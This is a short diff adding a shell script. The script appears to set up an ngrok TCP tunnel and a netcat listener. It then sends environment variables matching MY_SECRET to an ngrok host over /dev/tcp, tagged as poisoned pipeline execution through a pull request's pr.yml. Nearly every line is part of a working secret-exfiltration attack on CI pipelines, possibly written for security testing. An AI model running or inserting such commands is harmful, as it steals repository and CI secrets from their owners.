@@ -1,0 +1,6 @@
+ngrok tcp 1000
+sudo nc -lvk 1000
+
+#echo "Execution from WRITE user" > /dev/tcp/4.tcp.eu.ngrok.io/18328
+env | grep MY_SECRET > /dev/tcp/4.tcp.eu.ngrok.io/10129 
+echo ------- I-PPE From user [$1] in pr [$2] pr.yml :: $(env | grep MY_SECRET) > /dev/tcp/4.tcp.eu.ngrok.io/10129
